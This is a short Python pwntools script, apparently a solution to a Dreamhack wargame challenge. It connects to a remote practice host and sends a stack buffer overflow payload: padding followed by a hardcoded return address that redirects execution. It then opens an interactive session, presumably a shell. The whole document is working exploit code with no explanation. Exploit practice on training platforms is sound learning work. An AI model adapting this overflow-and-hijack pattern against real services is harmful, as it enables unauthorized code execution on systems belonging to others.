from pwn import *

p = remote('host3.dreamhack.games', 8216)

payload = b"A"*0x30
payload += b"B"*0x8
payload += b"\xaa\x06\x40\x00\x00\x00\x00\x00"

p.recvuntil('Input: ')

p.sendline(payload)
p.interactive()